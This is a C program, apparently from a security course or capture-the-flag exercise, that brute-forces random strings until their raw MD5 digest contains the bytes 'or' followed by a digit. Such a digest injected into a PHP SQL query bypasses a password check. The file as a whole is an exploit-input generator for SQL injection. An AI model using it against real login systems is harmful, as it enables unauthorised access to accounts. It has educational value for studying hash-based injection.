#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/md5.h>
 
//Base code taken from https://rosettacode.org/wiki/MD5#C
//Thanks to @379 on piazza
//gcc three.c -o three -lssl -lcrypto -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include
//add -w at the end to suppress warnings

int main() {
  unsigned char result[MD5_DIGEST_LENGTH];
  unsigned char str[256];
  int counter;
  unsigned long long num = 0;
 
  //MD5(string, strlen(string), result);
  //MD5 is 32 hex digits We need any 5 to be 27 4F/6F 52/72 27 31..39
  //since php is using the raw binary form of the MD5
  //'or'{not0}
  //'Or'{not0}
  //'oR'{not0}
  //'OR'{not0}

   
  unsigned char answer[4] = {0x27, 0x4F, 0x52, 0x27, 0};
  unsigned char answer1[4] = {0x27, 0x6F, 0x72, 0x27, 0};
 
  while(1){
    sprintf(str, "%d%d%d%d", rand(), rand(), rand(), rand()); //Generate some big random numbers

    MD5(str, strlen(str), result);
    //To test
    //unsigned char result[MD5_DIGEST_LENGTH] = {0x5f, 0x4d, 0xcc, 0x3b, 0x5a, 0xa7, 0x65, 0xd6, 0x27, 0x27, 0x27, 0x27, 0x4f, 0x52, 0x27, 0x31};

    //printf("Tries: %llu\n", num);
    //printf("Password: ");
    //printf(str);
    //printf("\nHashed pass: ");
    //for(int i = 0; i < MD5_DIGEST_LENGTH; i++)
    //  printf("%02x", result[i]);//
    //printf("\n");

    counter = 0;
    for(int i = 0; i < MD5_DIGEST_LENGTH; i++){
      if(result[i] == answer[counter] || result[i] == answer1[counter]){
        //printf("yes ");
        //printf("%02x ", result[i]);
        //printf("%02x\n", answer[counter]);

        counter++;
      }
      else if(result[i] == answer[0] || result[i] == answer1[0]){
        //printf("reset ");
        //printf("%02x ", result[i]);
        //printf("%02x\n", answer[counter]);
        i--;
        counter = 0;
      }
      else {
        //printf("no ");
        //printf("%02x ", result[i]);
        //printf("%02x\n", answer[counter]);

        counter = 0;
      }

      if(counter == 4){
        if(result[i+1] == 0x31 || result[i+1] == 0x32 || result[i+1] == 0x33 ||
           result[i+1] == 0x34 || result[i+1] == 0x35 || result[i+1] == 0x36 ||
           result[i+1] == 0x37 || result[i+1] == 0x38 || result[i+1] == 0x39){

          printf("Tries: %llu\n", num);
          printf("Password: ");
          printf(str);
          printf("\nHashed pass: ");
          for(int i = 0; i < MD5_DIGEST_LENGTH; i++)
            printf("%02x", result[i]);//
          printf("\n");
          return 0;
        }
      }
    }
    num++;
  }
}
